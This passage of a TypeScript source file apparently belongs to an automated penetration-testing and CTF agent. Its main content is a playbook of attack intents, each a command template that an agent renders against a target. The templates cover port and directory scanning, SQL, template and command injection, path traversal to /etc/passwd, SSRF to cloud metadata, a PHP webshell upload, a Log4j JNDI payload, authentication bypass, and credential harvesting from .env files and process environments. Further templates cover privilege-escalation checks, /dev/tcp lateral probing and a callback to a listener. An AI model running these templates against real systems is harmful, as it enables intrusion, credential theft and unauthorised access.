		message: `策略收敛（completionRejects=${rejects}${sealRec.recommend ? `, ${sealRec.reasons.join(",")}` : ""}）：当前无已确认正向漏洞/Flag，严禁原样重跑空转循环${pivotHint}；请转向 phase=report 汇总已排除攻击面并执行 sealEngagement(status="sealed_negative") 合法收口。`,
		...(searchPivot ? { searchPivot } : {}),
	};
}

export const getCompletionRejectAdvice = buildConvergenceAdvice;

export function countNovelFacts(st: NuwaState): number {
	return Object.values(st.facts ?? {}).filter((f) => f.kind !== "blocked").length;
}

export function tickNoveltyStall(
	st: NuwaState,
	cfg?: Partial<Cfg>,
): { noveltyStall: number; escalated: boolean; threshold: number } {
	const threshold = readNoveltyThreshold(cfg);
	const curNovel = countNovelFacts(st);
	const prevNovel =
		typeof st.runtime.lastNovelFacts === "number" && st.runtime.lastNovelFacts >= 0
			? st.runtime.lastNovelFacts
			: 0;

	if (curNovel > prevNovel) {
		st.runtime.noveltyStall = 0;
		st.runtime.semanticStall = false;
		st.runtime.lastNovelFacts = curNovel;
		return { noveltyStall: 0, escalated: false, threshold };
	}

	st.runtime.lastNovelFacts = curNovel;
	st.runtime.noveltyStall = (st.runtime.noveltyStall ?? 0) + 1;
	const escalated = st.runtime.noveltyStall >= threshold;
	st.runtime.semanticStall = escalated;
	return { noveltyStall: st.runtime.noveltyStall, escalated, threshold };
}

// ============================================================================
// 内置 playbook：32 条意图，六阶段。详情在 claim 时按目标渲染。
// 占位符：{URL} {HOST} {PORT} {OUT} {ID}
// ============================================================================

export const SEEDS: Record<Phase, Seed[]> = {
	recon: [
		{
			key: "http",
			title: "HTTP 存活与响应指纹",
			priority: 90,
			detail: `目标: 确认 HTTP 存活、状态码、Server/Powered-By、标题、跳转链、Cookie 属性。
命令:
  mkdir -p {OUT}
  curl -k -sS -D {OUT}/hdr.txt -o {OUT}/body.html -w 'code=%{http_code} size=%{size_download} type=%{content_type} final=%{url_effective}\\n' --max-time 15 {URL}
  sed -n '1,40p' {OUT}/hdr.txt
  grep -oiE '<title>[^<]*</title>' {OUT}/body.html | head -3
  whatweb -a 3 --no-color {URL} 2>/dev/null || true
证据: kind=service；title 写 "HTTP <code> <server>"；detail 必须含 Server、X-Powered-By、Set-Cookie 名称、页面标题。
换路: code=000 → 试 https 与相邻端口；403/406 → 记录 WAF 指纹，转目录枚举与源站探测。`,
		},
		{
			key: "ports",
			title: "端口与服务枚举",
			priority: 88,
			detail: `目标: 找出全部开放端口与服务版本，为后续攻击面提供入口。
命令:
  nmap -sT -sV -Pn -T4 --top-ports 2000 -oN {OUT}/nmap.txt {HOST}
  awk '/^[0-9]+\\/tcp/{print}' {OUT}/nmap.txt
  nmap -sT -p- --min-rate 3000 -Pn -T4 -oN {OUT}/nmap-all.txt {HOST}   # 时间允许时执行
证据: kind=service，每个开放端口一条 commit；detail 含 port/proto/service/version。
换路: 全端口被限速 → 保留 top2000 结果，标记 "全端口未完成" 在 note，不阻塞阶段推进。`,
		},
		{
			key: "dirs",
			title: "目录与文件发现",
			priority: 80,
			detail: `目标: 找隐藏目录、备份、管理面、上传点。
命令:
  ffuf -u {URL}/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -mc all -fc 404 -t 50 -timeout 10 -of json -o {OUT}/ffuf-dir.json
  # 字典缺失时依次换:
  #   /usr/share/wordlists/dirb/common.txt
  #   /usr/share/seclists/Discovery/Web-Content/common.txt
  jq -r '.results[] | [.status,.length,.url] | @tsv' {OUT}/ffuf-dir.json 2>/dev/null | sort -k1,1n | head -40
证据: kind=endpoint；至少 1 条非 404 路径，detail 含 status/length/redirect。
换路: 全 403 → 换 UA、加 X-Forwarded-For，测路径规范化绕过。`,
		},
		{
			key: "vhost",
			title: "虚拟主机与子域",
			priority: 60,
			detail: `目标: 同 IP 的其它站点常是薄弱入口。
命令:
  base=$(curl -k -sS -o /dev/null -w '%{size_download}' -H 'Host: random-{ID}.{HOST}' {URL})
  ffuf -u {URL} -H 'Host: FUZZ.{HOST}' -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -fs "$base" -t 40 -timeout 10 -of json -o {OUT}/ffuf-vhost.json
  jq -r '.results[] | [.status,.length,.input.FUZZ] | @tsv' {OUT}/ffuf-vhost.json 2>/dev/null | head -20
证据: kind=asset；detail 含 vhost 名、status、size 与基线差异。
换路: 目标非域名 → 跳过，commit blocked 并写明原因。`,
		},
		{
			key: "tlsjs",
			title: "证书 SAN 与前端端点提取",
			priority: 55,
			detail: `目标: 从证书拿域名，从 HTML/JS 拿接口。
命令:
  openssl s_client -connect {HOST}:{PORT} -servername {HOST} </dev/null 2>/dev/null | openssl x509 -noout -subject -issuer -dates -ext subjectAltName
  grep -oE '(src|href)="[^"]+"' {OUT}/body.html | sed 's/.*="//;s/"//' | sort -u | head -50
  for f in $(grep -oE 'src="[^"]+\\.js[^"]*"' {OUT}/body.html | sed 's/src="//;s/"//'); do
    curl -k -sS --max-time 10 "{URL}/$f" | grep -oE '"/[a-zA-Z0-9_./?=&-]{3,}"' ; done | sort -u | head -60
证据: kind=endpoint；至少 1 条 API 路径或 1 个证书域名。
换路: 无 JS → 只交证书与链接，不阻塞。`,
		},
		{
			key: "techcve",
			title: "技术栈到 CVE 映射",
			priority: 70,
			detail: `目标: 把 recon 拿到的产品与版本映射到可利用 CVE。
动作: 调 nuwa_kb(query="<product> <version>", kind="auto")；对每个候选 CVE 再调 nuwa_kb(query="CVE-XXXX-XXXX")。
要求: 只记录与实测版本匹配的 CVE；detail 写 product/version/cve/cvss/利用条件。
证据: kind=vuln；必须附一条复现命令与回显（哪怕只是版本确认命令）。
换路: 无版本信息 → 把指纹事实写 note，转组件默认口令与已知路径。`,
		},
	],
	surface: [
		{
			key: "crawl",
			title: "站点爬取与路由收敛",
			priority: 85,
			detail: `目标: 拿到完整路由表与参数集合。
命令:
  katana -u {URL} -d 3 -jc -silent -o {OUT}/katana.txt 2>/dev/null || \
  (curl -k -sS {URL} | grep -oE 'href="[^"]+"' | sed 's/href="//;s/"//' | sort -u > {OUT}/katana.txt)
  sort -u {OUT}/katana.txt | head -100
证据: kind=endpoint；detail 含路径、方法（GET/POST）、参数名。
换路: katana 未安装 → 用 curl + 链接提取，再手工补 /api /admin /login。`,
		},
		{
			key: "params",
			title: "参数与输入面清点",
			priority: 80,
			detail: `目标: 列出所有可控输入，标注注入候选。
命令:
  grep -rhoE '[?&][a-zA-Z0-9_]+=' {OUT}/katana.txt | sort -u
  grep -rhoE '<(input|textarea|select)[^>]*name="[^"]+"' {OUT}/body.html | sort -u
  grep -rhoE 'name="[^"]+"' {OUT}/body.html | sort -u
证据: kind=endpoint；每条 detail 写 参数名/位置(query|body|header|cookie)/示例值。
换路: 无表单 → 从 JS 里提取 fetch/axios 调用参数。`,
		},
		{
			key: "auth",
			title: "认证面与默认凭据",
			priority: 78,
			detail: `目标: 找登录、注册、找回、JWT/Cookie 处理缺陷。
命令:
  for p in /login /admin /api/login /user/login /signin /register /forgot; do
    printf '%s ' "$p"; curl -k -sS -o /dev/null -w '%{http_code} %{size_download}\\n' --max-time 8 "{URL}$p"; done
  curl -k -sS -D - -o /dev/null {URL}/login | grep -iE 'set-cookie|www-authenticate|location'
  # 默认口令只试 5 组，避免锁号: admin/admin admin/password admin/admin123 root/root test/test
证据: kind=endpoint 或 cred；cred 必须附成功登录命令与回显（状态码/令牌前 8 位）。
换路: 有验证码/锁定 → 记录策略，转 JWT 解析与越权测试。`,
		},
		{
			key: "sensitive",
			title: "敏感文件与暴露面",
			priority: 76,
			detail: `目标: 拿源码、配置、密钥、监控端点。
命令:
  for p in .git/HEAD .env .env.bak config.php.bak backup.zip www.zip db.sql swagger.json openapi.json actuator/env actuator/health server-status phpinfo.php .DS_Store; do
    printf '%-24s ' "$p"; curl -k -sS -o /dev/null -w '%{http_code} %{size_download}\\n' --max-time 8 "{URL}/$p"; done
  curl -k -sS {URL}/.git/HEAD
证据: kind=loot 或 endpoint；loot 必须含文件内容前 20 行与完整 curl 命令。
换路: 全 404 → 用 ffuf 的扩展名字典补扫 .bak/.old/.zip/.tar.gz。`,
		},
		{
			key: "api",
			title: "API 与 GraphQL 面",
			priority: 74,
			detail: `目标: 找未授权接口、 introspection、批量赋值。
命令:
  for p in /api /api/v1 /api/v2 /graphql /swagger-ui /v3/api-docs /openapi.json; do
    printf '%-16s ' "$p"; curl -k -sS -o /dev/null -w '%{http_code} %{size_download}\\n' --max-time 8 "{URL}$p"; done
  curl -k -sS -X POST {URL}/graphql -H 'Content-Type: application/json' -d '{"query":"{__schema{types{name}}}"}' | head -c 800
  curl -k -sS {URL}/v3/api-docs | head -c 1200
证据: kind=endpoint；GraphQL 需记录是否开启 introspection。
换路: 401/403 → 带匿名 token、换 method、试 /api/internal。`,
		},
		{
			key: "uploads",
			title: "上传点与文件处理面",
			priority: 60,
			detail: `目标: 找上传、导入、头像、附件接口。
命令:
  grep -rniE 'upload|multipart|filename|Content-Disposition' {OUT}/katana.txt {OUT}/body.html 2>/dev/null | head -30
  curl -k -sS -D - -o /dev/null -X OPTIONS {URL}/upload
证据: kind=endpoint；detail 写 路径/字段名/允许类型/返回结构。
换路: 无上传 → 跳过并 blocked 记录。`,
		},
	],
	vuln: [
		{
			key: "sqli",
			title: "SQL 注入验证",
			priority: 90,
			detail: `目标: 对参数化候选做注入验证，拿到数据库证据。
命令:
  sqlmap -u "{URL}/<path>?<param>=1" --batch --level 3 --risk 2 --dbs --output-dir={OUT}/sqlmap
  # 手工快速判定:
  curl -k -sS "{URL}/<path>?<param>=1'"
  curl -k -sS "{URL}/<path>?<param>=1%20AND%201=1"
  curl -k -sS "{URL}/<path>?<param>=1%20AND%201=2"
证据: kind=vuln；detail 含 注入点、DBMS、布尔/时间差异、可读库名。
换路: WAF 403 → 换编码、大小写、注释符；仍失败则 blocked 并写 WAF 证据。`,
		},
		{
			key: "xss",
			title: "反射/存储型 XSS 验证",
			priority: 70,
			detail: `目标: 证明脚本可执行，而不是只回显。
命令:
  curl -k -sS "{URL}/<path>?q=<script>alert(1)</script>" | grep -n 'alert(1)'
  curl -k -sS "{URL}/<path>?q=\\"'><img src=x onerror=alert(1)>" | grep -n 'onerror'
  # 有浏览器时用 headless 截图/执行确认: npx playwright ... 或 chromium --headless --dump-dom
证据: kind=vuln；detail 含 payload、上下文（HTML/属性/JS）、是否执行。
换路: 只编码不回显 → 记录编码策略，转 DOM XSS 的 source/sink。`,
		},
		{
			key: "ssti",
			title: "模板注入验证",
			priority: 76,
			detail: `目标: 用算术回显区分模板引擎。
命令:
  curl -k -sS "{URL}/<path>?name={{7*7}}" | grep -n '49'
  curl -k -sS "{URL}/<path>?name=\${7*7}" | grep -n '49'
  curl -k -sS "{URL}/<path>?name=<%= 7*7 %>" | grep -n '49'
证据: kind=vuln；detail 含 payload、引擎推断、回显位置。
换路: 49 被过滤 → 用 {{7*'7'}} 区分 Jinja/Twig。`,
		},
		{
			key: "lfi",
			title: "路径穿越与文件读取",
			priority: 74,
			detail: `目标: 读 /etc/passwd 或应用配置。
命令:
  curl -k -sS --path-as-is "{URL}/<path>?file=../../../../etc/passwd" | head -5
  curl -k -sS --path-as-is "{URL}/<path>?file=....//....//....//etc/passwd" | head -5
  curl -k -sS --path-as-is "{URL}/static/../../../../etc/passwd" | head -5
证据: kind=vuln；detail 含 payload、读到的文件头、绝对路径。
换路: 过滤 ../ → 用 URL 编码 %2e%2e%2f、双写、绝对路径。`,
		},
		{
			key: "ssrf",
			title: "SSRF 与内网探测",
			priority: 72,
			detail: `目标: 让服务端发起请求，证明可达内网/元数据。
命令:
  curl -k -sS "{URL}/<path>?url=http://127.0.0.1:80/"
  curl -k -sS "{URL}/<path>?url=http://169.254.169.254/latest/meta-data/"
  curl -k -sS "{URL}/<path>?url=file:///etc/passwd" | head -5
  # 盲 SSRF: 用可回连监听或 DNS 日志确认
证据: kind=vuln；detail 含 参数、协议、回显差异或回连时间戳。
换路: 只允许 https → 用 302 跳转、DNS rebinding 服务。`,
		},
		{
			key: "cmdi",
			title: "命令注入验证",
			priority: 82,
			detail: `目标: 证明命令执行，拿到 id/hostname。
命令:
  curl -k -sS "{URL}/<path>?cmd=;id"
  curl -k -sS "{URL}/<path>?cmd=|id"
  curl -k -sS "{URL}/<path>?cmd=%24(id)"
  curl -k -sS "{URL}/<path>?cmd=;sleep%205"   # 时间盲判
证据: kind=vuln；detail 含 payload、uid/gid、hostname、时间差。
换路: 分号被过滤 → 换 | || & && 换行 %0a；无回显 → 时间盲注 + DNS 外带。`,
		},
		{
			key: "upload-vuln",
			title: "上传绕过与落地验证",
			priority: 68,
			detail: `目标: 上传可执行文件并确认可访问/执行。
命令:
  printf '<?php echo "NUWA-OK"; ?>' > {OUT}/p.php
  curl -k -sS -F 'file=@'{OUT}/p.php';type=image/png' -F 'filename=p.png' {URL}/upload
  curl -k -sS -F 'file=@'{OUT}/p.php';filename=p.php' {URL}/upload
  curl -k -sS {URL}/uploads/p.php
证据: kind=vuln；detail 含 字段名、绕过手法、落地 URL、回显 "NUWA-OK"。
换路: 白名单 → 试 .phtml/.phar/.jsp/.jspx；有重命名 → 结合 LFI。`,
		},
		{
			key: "idor",
			title: "越权与 IDOR",
			priority: 70,
			detail: `目标: 用低权/匿名身份访问他人资源。
命令:
  # 先登录两个账号，保存 cookie
  curl -k -sS -b a.cookie "{URL}/api/user/1"
  curl -k -sS -b b.cookie "{URL}/api/user/1"
  curl -k -sS -b b.cookie "{URL}/api/order/1001"
  curl -k -sS "{URL}/api/user/1"
证据: kind=vuln；detail 含 资源 id、身份、返回字段差异（脱敏）。
换路: UUID 不可枚举 → 从列表接口/导出接口拿 id。`,
		},
		{
			key: "authbypass",
			title: "认证与授权绕过",
			priority: 76,
			detail: `目标: 跳过登录或提升角色。
命令:
  curl -k -sS {URL}/admin
  curl -k -sS -H 'X-Forwarded-For: 127.0.0.1' -H 'X-Real-IP: 127.0.0.1' {URL}/admin
  curl -k -sS -H 'X-Original-URL: /admin' {URL}/
  curl -k -sS -X POST {URL}/api/login -H 'Content-Type: application/json' -d '{"user":"admin","pass":{"$ne":null}}'
  # JWT: 解码后试 alg=none / 弱密钥
证据: kind=vuln；detail 含 绕过 header/payload、返回码、可见管理字段。
换路: 全 302 → 跟随后检查是否真的进入后台。`,
		},
		{
			key: "component",
			title: "组件漏洞复现",
			priority: 80,
			detail: `目标: 把 techcve 的候选变成可复现请求。
命令:
  # 按 CVE 类型选择: 路径穿越 / 反序列化 / OGNL / JNDI / 文件读取
  curl -k -sS "{URL}/<vuln-path>" -H '<required-header>'
  # Log4j 例: curl -H 'X-Api-Version: \${jndi:ldap://<dns-log>/a}' {URL}
  # Tomcat 例: curl --path-as-is "{URL}/..;/..;/manager/html"
证据: kind=vuln；detail 含 CVE、请求原文、响应证据、影响版本匹配依据。
换路: 版本不匹配 → 记录实际版本，回到 techcve 重新映射。`,
		},
	],
	exploit: [
		{
			key: "verify",
			title: "利用链端到端验证",
			priority: 90,
			detail: `目标: 把单点漏洞串成一条可重复的攻击链。
动作: 从 vuln 事实里选危害最高的一条，按 入口 → 执行 → 结果 三步重放；每条命令写入 detail。
要求: 必须有一条命令能稳定复现核心结果（RCE/文件读取/越权数据）。
证据: kind=vuln 或 loot；detail 含 前置条件、完整命令、关键回显。
换路: 不稳定 → 降级为单点证明，标注复现率。`,
		},
		{
			key: "rce",
			title: "命令执行与反弹",
			priority: 88,
			detail: `目标: 证明可控执行并拿到主机身份。
命令:
  curl -k -sS "{URL}/<rce-path>?cmd=id;hostname;uname -a"
  curl -k -sS "{URL}/<rce-path>?cmd=cat%20/etc/passwd%20|%20head%20-3"
  # 反弹只用内网可达地址，先确认出网:
  curl -k -sS "{URL}/<rce-path>?cmd=curl%20-sS%20http://<listener>/ping"
证据: kind=vuln；detail 含 uid、hostname、内核、出网结论。
换路: 无出网 → 走文件写入 + Web 访问的回显通道。`,
		},
		{
			key: "creds",
			title: "凭据与配置提取",
			priority: 84,
			detail: `目标: 从应用/容器/数据库拿可用凭据。
命令:
  curl -k -sS "{URL}/.env"
  curl -k -sS "{URL}/config.php.bak"
  # 有 shell 时:
  find / -maxdepth 4 -name '*.env' -o -name 'config.*' 2>/dev/null | head -30
  env | sort
  cat /proc/1/environ | tr '\\0' '\\n'
证据: kind=cred 或 loot；凭据必须附读取命令与脱敏后的值（保留前 4 位）。
换路: 无凭据 → 转数据库端口弱口令与 Redis 未授权。`,
		},
		{
			key: "privesc",
			title: "提权面核查",
			priority: 70,
			detail: `目标: 从 Web 用户到 root/SYSTEM。
命令:
  id; sudo -n -l 2>&1; uname -a
  find / -perm -4000 -type f 2>/dev/null | head -30
  getcap -r / 2>/dev/null | head -30
  cat /etc/crontab; ls -la /etc/cron.* 2>/dev/null
  # 内核/容器逃逸线索:
  cat /proc/1/cgroup; ls -la /.dockerenv 2>/dev/null
证据: kind=vuln；detail 含 当前用户、可利用项、验证命令、实际提权结果。
换路: 无本地 shell → 跳过并 blocked，不虚构。`,
		},
		{
			key: "lateral",
			title: "内网横向可达性",
			priority: 60,
			detail: `目标: 确认从当前主机可达的内网资产。
命令:
  ip a; ip route
  cat /etc/hosts; cat ~/.ssh/config 2>/dev/null
  for h in 10.0.0.1 172.17.0.1 192.168.1.1; do timeout 2 bash -c "echo > /dev/tcp/$h/22" 2>/dev/null && echo "$h:22 open"; done
  ss -lntup 2>/dev/null | head -30
证据: kind=asset；detail 含 网段、可达主机、开放端口、凭据复用结论。
换路: 无 shell → 用 SSRF 做端口探测，标注盲探。`,
		},
	],
	post: [
		{
			key: "flag",
			title: "Flag 定位与取证",
			priority: 95,
			detail: `目标: 找到并证明 flag（CTF）或核心数据（pentest）。
命令:
  find / -maxdepth 5 -iname '*flag*' 2>/dev/null | head -30
  grep -rIl 'flag{' /var/www /home /tmp /opt 2>/dev/null | head -20
  env | grep -i flag
  # 数据库:
  mysql -uroot -p'<pass>' -e 'show databases;' 2>/dev/null
  redis-cli -h 127.0.0.1 keys '*' 2>/dev/null | head
证据: kind=flag；value 必须是完整 flag 字符串，命令与回显一起提交。
换路: 无 flag 文件 → 查环境变量、数据库、启动脚本、容器镜像层。`,
		},
		{
			key: "loot",
			title: "数据与配置取证",
			priority: 70,
			detail: `目标: 收集能证明影响面的数据（脱敏）。
命令:
  ls -la /var/www; du -sh /var/www/* 2>/dev/null
  find /var/www -maxdepth 3 -type f -name '*.sql' -o -name '*.db' 2>/dev/null | head
  head -20 /etc/passwd; tail -50 /var/log/auth.log 2>/dev/null
证据: kind=loot；detail 含 文件路径、大小、敏感字段名；值脱敏。
换路: 只读容器 → 记录镜像与环境变量。`,
		},
		{
			key: "impact",
			title: "影响面与持久化评估",
			priority: 50,
			detail: `目标: 说明拿到权限后的实际影响，不实际破坏。
检查:
  crontab -l; ls -la /etc/cron.d 2>/dev/null
  systemctl list-units --type=service --state=running 2>/dev/null | head -20
  ls -la ~/.ssh; cat ~/.ssh/authorized_keys 2>/dev/null
证据: kind=note；detail 写 可持久化点、影响范围、是否需要清理。
换路: 无权限 → 用已读配置推断，标注推断。`,
		},
	],
	report: [
		{
			key: "chain",
			title: "攻击链整理",
			priority: 90,
			detail: `目标: 把 facts/intents 整理成 入口 → 利用 → 结果 的链。
动作: 调 nuwa_report(write=false) 看自动生成的链；补齐缺失节点（补 commit）后再生成。
要求: 每个节点有 fact id、intent id、命令、关键回显。
证据: kind=note；detail 写 链节点顺序与缺口。
换路: 链断在信息收集 → 回补 recon/surface 意图。`,
		},
		{
			key: "fix",
			title: "修复建议",
			priority: 60,
			detail: `目标: 对每条 vuln 给可落地修复项。
要求: 一条 vuln 对应一条建议，含 位置、根因、修复动作、验证方法。
证据: kind=note；不要写泛泛的"加强安全意识"。
换路: 无 vuln → 只交资产与暴露面收敛建议。`,
		},
	],
};

export function phaseIndex(p: Phase): number {
	return PHASE_ORDER.indexOf(p);
}

export function renderDetail(detail: string, st: NuwaState, intentId: string): string {
	const p = st.project;
	return detail
		.replaceAll("{URL}", p.url)
		.replaceAll("{HOST}", p.host)
		.replaceAll("{PORT}", String(p.port))
		.replaceAll("{OUT}", `/tmp/nuwa/${p.id}`)
		.replaceAll("{ID}", intentId);
}

// ============================================================================
// 状态机与多领域 Profile 适配
// ============================================================================

function seedsForProject(st: NuwaState, phase: Phase): Seed[] {
	const mode = st.project.mode;
	if (mode === "coding" || mode === "ops" || isLocalAuditProject(st)) {
		const prof = getProfile(mode);
		return prof.seeds[phase] ?? [];
	}
	return SEEDS[phase] ?? [];
}

export function proofKinds(mode: Mode): FactKind[] {
	if (mode === "ctf") return ["flag"];
	if (mode === "audit") return ["vuln", "loot"];
	if (mode === "pentest") return ["vuln", "loot", "flag"];
	return getProfile(mode).proofKinds;
}

export function seedPhase(st: NuwaState, phase: Phase): string[] {
	const seeds = seedsForProject(st, phase);
	const existing = new Set(Object.values(st.intents).map((i) => i.key));
	const added: string[] = [];
	for (const s of seeds) {
		const key = `${phase}:${s.key}`;
		if (existing.has(key)) continue;
		const built = buildIntentDedupKey(
			{
				key,
				phase,
				title: s.title,
				detail: s.detail,
				expectedKind: s.expectedKind,
				surfaceDomain: s.surfaceDomain,
			},
			st.project.host,
		);
		const id = nextIntentId(st);
		st.intents[id] = {
			id,
			phase,
			key,
			title: s.title,
			detail: s.detail,
			from: [],
			status: "open",
			priority: s.priority ?? 50,
			attempts: 0,
			createdAt: nowIso(),
			expectedKind: built.expectedKind,
			targetKey: built.targetKey,
			surfaceDomain: built.surfaceDomain,
			dedupKey: built.dedupKey,
			hintHash: built.hintHash,
		};
		added.push(id);
	}
	return added;
}

export interface AddIntentInput {
	title: string;
	detail?: string;
	hint?: string;
	target?: string;
	targetKey?: string;
	expectedKind?: FactKind;
	surfaceDomain?: SurfaceDomain;
	phase?: Phase;
	from?: string[];
	priority?: number;
	force?: boolean;
}

function checkCandidateRejection(
	st: NuwaState,
	built: {
		dedupKey: string;
		expectedKind: FactKind;
		targetKey: string;
		surfaceDomain: SurfaceDomain;
		hintHash: string;
	},
	rawKey: string,
	from: string[],
	opts?: {
		force?: boolean;
		cooldownMs?: number;
		strictAutoDerive?: boolean;
		bypassTargetSuppress?: boolean;
	},
): PlanRejectReason | null {
	const host = st.project?.host ?? "";
	const intents = Object.values(st.intents ?? {});

	if (opts?.bypassTargetSuppress) {
		if (intents.some((i) => i.key === rawKey)) {
			const hit = intents.find((i) => i.key === rawKey)!;
			return hit.status === "claimed" ? "inflight" : "duplicate_key";
		}
		return null;
	}

	if (opts?.force === true) {
		// force=true 时仅拦仍在 claimed 执行中的完全同键任务，允许重排已尝试/冷却中目标
		if (intents.some((i) => i.status === "claimed" && (i.key === rawKey || i.dedupKey === built.dedupKey))) {
			return "inflight";
		}
		return null;
	}

	// 1. 在途检查（claimed 同三元组或非种子同域同目标同期望类型）
	const isSeedTarget = built.targetKey.startsWith("seed:");
	for (const it of intents) {
		if (it.status !== "claimed") continue;
		if (it.key === rawKey || (it.dedupKey && it.dedupKey === built.dedupKey)) {
			return "inflight";
		}
		if (!isSeedTarget) {
			const itTarget = it.targetKey ? normalizeTargetKey(it.targetKey, host) : extractIntentTargetKey(it, host);
			const itDomain = it.surfaceDomain ?? inferSurfaceDomain(itTarget);
			const itKind = it.expectedKind ?? inferExpectedKind(it);
			if (itDomain === built.surfaceDomain && itTarget === built.targetKey && itKind === built.expectedKind) {
				return "inflight";
			}
		}
	}

	// 2. 冷却窗内 blocked targetKey 抑制（#43, #25 按 surfaceDomain 隔离）
	if (
		!isSeedTarget &&
		isTargetInBlockedCooldown(st, built.targetKey, {
			surfaceDomain: built.surfaceDomain,
			cooldownMs: opts?.cooldownMs,
			force: opts?.force,
			from,
			strictAutoDerive: opts?.strictAutoDerive,
		})
	) {
		return "blocked_cooldown";
	}

	// 3. 规范化三元组去重键与已尝试过滤器（#21, #43）
	for (const it of intents) {
		if (it.key === rawKey) return "duplicate_key";
		const itDedup =
			it.dedupKey ??
			buildIntentDedupKey(
				{
					key: it.key,
					phase: it.phase,
					title: it.title,
					detail: it.detail,
					expectedKind: it.expectedKind,
					targetKey: it.targetKey,
					surfaceDomain: it.surfaceDomain,
				},
				host,
			).dedupKey;
		if (itDedup === built.dedupKey) {
			if (
				(it.status === "done" || it.status === "blocked") &&
				hasUnlockingPrerequisiteFacts(st, it.doneAt ?? it.createdAt, it.from ?? [], from, Boolean(opts?.strictAutoDerive))
			) {
				continue;
			}
			return "duplicate_key";
		}
	}

	if (
		!isSeedTarget &&
		attempted(st, built.expectedKind, built.targetKey, {
			force: opts?.force,
			from,
			surfaceDomain: built.surfaceDomain,
			strictAutoDerive: opts?.strictAutoDerive,
		})
	) {
		// 若提供了显式不同的非空 hint（新攻击向量/新测试面）且不在冷却窗内，放行新向量（#43）
		const sameVectorAttempted = Object.values(st.intents ?? {}).some((it) => {
			if (it.status !== "done" && it.status !== "blocked") return false;
			const b = buildIntentDedupKey(it, host);
			return b.dedupKey === built.dedupKey;
		});
		if (sameVectorAttempted || opts?.strictAutoDerive) {
			return "duplicate_key";
		}
	}

	return null;
}

export function addIntent(
	st: NuwaState,
	input: AddIntentInput,
): Intent {
	const title = (input.title ?? "").trim();
	if (!title) throw new Error("intent.title 为空");
	const from = input.from ?? [];
	for (const f of from) {
		if (!st.facts[f]) throw new Error(`依赖事实不存在: ${f}`);
	}
	const phase = input.phase ?? st.project.phase;
	const built = buildIntentDedupKey(
		{
			phase,
			title,
			detail: input.detail,
			hint: input.hint,
			target: input.target,
			targetKey: input.targetKey,
			expectedKind: input.expectedKind,
			surfaceDomain: input.surfaceDomain,
		},
		st.project.host,
	);
	const id = nextIntentId(st);
	const intent: Intent = {
		id,
		phase,
		key: `custom:${sha(built.dedupKey)}`,
		title: normOneLine(title, 120),
		detail: input.detail ?? "",
		from,
		status: "open",
		priority: Number.isFinite(input.priority) ? Number(input.priority) : 50,
		attempts: 0,
		createdAt: nowIso(),
		expectedKind: built.expectedKind,
		targetKey: built.targetKey,
		surfaceDomain: built.surfaceDomain,
		dedupKey: built.dedupKey,
		hintHash: built.hintHash,
	};
	st.intents[id] = intent;
	return intent;
}

export interface PlanIntentsResult {
	added: string[];
	phase: Phase;
	rejectedReasons: RejectedIntentEntry[];
}

/**
 * 批量规划意图（#43, #21, #25, #29）：
 * 使用规范化三元组 (expectedKind, normalizeTargetKey(target), hintHash) 去重，
 * 自动抑制在途 inflight 与冷却窗内的 blocked targetKey，并返回结构化 rejectedReasons。
 */
export function planIntents(
	st: NuwaState,
	input: {
		phase?: Phase;
		intents?: AddIntentInput[];
		force?: boolean;
		cooldownMs?: number;
	},
	cfg?: Partial<Cfg>,
): PlanIntentsResult {
	const added: string[] = [];
	const rejectedReasons: RejectedIntentEntry[] = [];
	const cooldownMs = input.cooldownMs ?? readEnvCooldownMs(cfg);

	if (input.phase) {
		if (phaseIndex(input.phase) > phaseIndex(st.project.phase)) {
			st.project.phase = input.phase;
		}
		const seeds = seedsForProject(st, input.phase);
		for (const s of seeds) {
			const key = `${input.phase}:${s.key}`;
			const built = buildIntentDedupKey(
				{
					key,
					phase: input.phase,
					title: s.title,
					detail: s.detail,
					expectedKind: s.expectedKind,
					surfaceDomain: s.surfaceDomain,
				},
				st.project.host,
			);
			const rej = checkCandidateRejection(st, built, key, [], {
				force: input.force,
				cooldownMs,
			});
			if (rej) {
				rejectedReasons.push({ title: s.title, targetKey: built.targetKey, reason: rej });
				continue;
			}
			const id = nextIntentId(st);
			st.intents[id] = {
				id,
				phase: input.phase,
				key,
				title: s.title,
				detail: s.detail,
				from: [],
				status: "open",
				priority: s.priority ?? 50,
				attempts: 0,
				createdAt: nowIso(),
				expectedKind: built.expectedKind,
				targetKey: built.targetKey,
				surfaceDomain: built.surfaceDomain,
				dedupKey: built.dedupKey,
				hintHash: built.hintHash,
			};
			added.push(id);
		}
	}

	for (const item of input.intents ?? []) {
		const title = (item.title ?? "").trim();
		if (!title) throw new Error("intent.title 为空");
		const from = item.from ?? [];
		for (const fid of from) {
			if (!st.facts[fid]) throw new Error(`依赖事实不存在: ${fid}`);
		}
		const phase = item.phase ?? input.phase ?? st.project.phase;
		const force = item.force ?? input.force ?? false;
		const built = buildIntentDedupKey(
			{
				phase,
				title,
				detail: item.detail,
				hint: item.hint,
				target: item.target,
				targetKey: item.targetKey,
				expectedKind: item.expectedKind,
				surfaceDomain: item.surfaceDomain,
			},
			st.project.host,
		);
		const rawKey = `custom:${sha(built.dedupKey)}`;

		// 若显式带了前置事实且存在跨层关系，校验跨层前置有效性（#25）
		if (from.length > 0 && item.surfaceDomain) {
			const parentDomains = from
				.map((fid) => st.facts[fid]?.surfaceDomain)
				.filter((d): d is SurfaceDomain => Boolean(d));
			if (parentDomains.length > 0 && !parentDomains.includes(built.surfaceDomain)) {
				if (!canDeriveCrossSurface(st, parentDomains[0], built.surfaceDomain, from)) {
					rejectedReasons.push({ title, targetKey: built.targetKey, reason: "blocked_cooldown" });
					continue;
				}
			}
		}

		const rej = checkCandidateRejection(st, built, rawKey, from, {
			force,
			cooldownMs,
			strictAutoDerive: false,
		});
		if (rej) {
			rejectedReasons.push({ title, targetKey: built.targetKey, reason: rej });
			continue;
		}
		const id = nextIntentId(st);
		st.intents[id] = {
			id,
			phase,
			key: rawKey,
			title: normOneLine(title, 120),
			detail: item.detail ?? "",
			from,
			status: "open",
			priority: Number.isFinite(item.priority) ? Number(item.priority) : 50,
			attempts: 0,
			createdAt: nowIso(),
			expectedKind: built.expectedKind,
			targetKey: built.targetKey,
			surfaceDomain: built.surfaceDomain,
			dedupKey: built.dedupKey,
			hintHash: built.hintHash,
		};
		added.push(id);
	}

	return { added, phase: st.project.phase, rejectedReasons };
}


/**
